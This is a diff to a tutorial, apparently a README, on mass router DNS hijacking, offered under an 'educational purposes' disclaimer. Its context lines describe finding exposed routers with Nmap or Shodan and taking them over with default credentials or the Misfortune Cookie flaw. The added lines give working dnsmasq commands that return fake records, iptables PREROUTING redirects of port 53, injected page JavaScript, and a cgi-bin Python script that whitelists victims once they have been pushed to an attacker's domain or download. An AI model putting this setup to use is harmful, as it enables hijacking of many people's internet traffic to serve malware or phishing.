@@ -18,6 +18,65 @@ This tutorial is for informational and educational purposes only. I believe that
 One of ways this tools can be used in, is using Nmap to scan massive IP ranges looking for routers that are exposed to WAN, most of them usually still hold the default login (example: user=admin pass=admin) then changing the DNS address in the DHCP settings, this process can be easily automated using a simple Python script and by using http requests or a Browser automation library (example: Selenium/Chromedriver-FirefoxDriver) you can automatically gain access to thousands of routers, there is also [Shodan](http://shodan.io) that can offer huge numbers of active IPs of routers that are exposed and you can even uses more filters to get only routers that uses a specific firmware/version on which you have a way to access even without default credentials (example : Millions of routers around the world uses Rompager/4.07 a firmware that have a critical vulnerability called [Misfortune Cookie](https://github.com/BenChaliah/MIPS-CVE-2014-9222)).
 However, setting thousands of routers towards your DNS similtanously raises another question, how much resources would the server require? The server must respond to the millions of requests each minutes withing few miliseconds for each request, so that the targets wouldn't notice a difference in latency in their internet connection, one of the tools known in the cyber security community for DNS hijacking called DNSChef, a tool that is built on python, which makes it very useful in the case of small sample testing but highly unreliable when you test it against much bigger samples giving high failure rate. On the other hand there's dnsmasq which is written in C (making it much much faster with very little resources) and it offers DNS caching, a DHCP server and more. But since it was not intended for DNS Hijacking it's not quite configurable for such use.
 
-However, in this analyzis I'll be explain how did I used it and other low level tools to make a server that even with very low specs (Example : Elastic computer hosted on AWS or gCloud 1 vcpu, 1Gb of memory) can offer for a huge number of targets a very low latency that compares to that of known public DNS such as `8.8.8.8`, or even supersede it depending on the location of the server and the targets.
+However, in this analysis I'll be explain how did I used it and other low level tools to make a server that even with very low specs (Example : Elastic computer hosted on AWS or gCloud 1 vcpu, 1 Gb of memory) can offer for a huge number of targets a very low latency that compares to that of known public DNS such as `8.8.8.8`, or even supersede it depending on the location of the server and the targets.
+
+
+### Tools
+```
+ > dnsmasq 2.79 (or later)
+ > Apache/2.4.29 (Ubuntu)
+ > conntrack v1.4 (or later)
+ > iptables v1.6.1 (or later)
+ > python2.7
+ > screen version 4.06 (or later)
+```
+
+## Summary
+
+* Component 1:
+
+You start two (or more depending on the exploitation) instances of dnsmasq and bind them to different ports
+
+```
+$ dnsmasq --no-hosts -p 531 --max-cache-ttl=0
+$ dnsmasq --no-hosts --address=/#/yourDNSIP  --server=/.youWebsiteDomain.tld/# -p 532 --max-cache-ttl=0
+```
+
+the first one in a regular resolver in order to provide the real DNS records, and the second one will always return an `A record` with the IP address of the server you deploy this docker on except for the domain (or domains, by adding `--server=/.domain2/#`) to which you want to force the targets
+
+* Component 2:
+
+We will be adding the some rules to `NAT` table, the idea is to forward connections comming through port 53 (UDP and TCP, but mainly the former) to either of the dnsmasq instances, and the way to do so is by putting the rule in __PREROUTING__ chain specification, first we'll forward all connections towards the DNS that would provide the __fake records__
+
+```
+$ iptables -t nat -A PREROUTING -p tcp -m tcp --dport 53 -j REDIRECT --to-port 532
+$ iptables -t nat -A PREROUTING -p udp -m udp --dport 53 -j REDIRECT --to-port 532
+```
+
+after the target get redirecred to the domain you which or download the software you wants, you need to trigger the process that will add an exception for the associated __REMOTE_ADDR__ in the port forwarding rules. Here's an example using Javascript, implemented in your domain page
+
+```
+<script type="text/javascript">
+	if (document.visibilityState == "visible") {
+		var xhttp = new XMLHttpRequest();
+		xhttp.open("GET", "http://myDNSIP/cgi-bin/route", true);
+		xhttp.send();
+	}
+</script>
+```
+
+the previous script will trigger the execution of a Python script inside cgi-bin. Now the script does multiple things but all are very lightweight, first create an empty file called __{REMOTE_ADDR}__ inside a folder called __IPS__, for instance, if the request came from `174.123.23.54` their will be a file called `174.123.23.54` inside IPS, then it'll generate a bash script that will be executed and delete itself when finished (by adding this command `rm -f -- "$0"` at the end). the bash contains also multiple iptables rules, which are the exceptions for all the targets that already went through the process:
+
+```
+for i in os.listdir("./ips/") + [os.environ['REMOTE_ADDR']]:
+	rules_str += "-A PREROUTING -s %s/32 -p udp -m udp --dport 53 -j REDIRECT --to-ports 531\n"%i
+
+# Then save the exceptions in a file inside a folder
+rules_path = "./tmp/script_%d.rules"%rand_name
+with open(rules_path, "w") as f:
+	f.write(base_query_str.replace("{loop_str}", rules_str))
+```
+
+An independant Python script running in a screen must update iptables rules every few miliseconds through `cat ./tmp/script_{rand_name}.rules | iptables-restore`. In order to improve efficiency and avoid running the same exceptions multiple times the independ Python script (or any other approach to loop this command) will be running `cat $(ls -1t /var/www/cgi-bin/tmp/*.rules | head -1) | iptables-restore`, the first part of the command will read the latest created rules file which will hold the previously generated rules without duplicates then pipe it to `iptables-restore`.
 
 
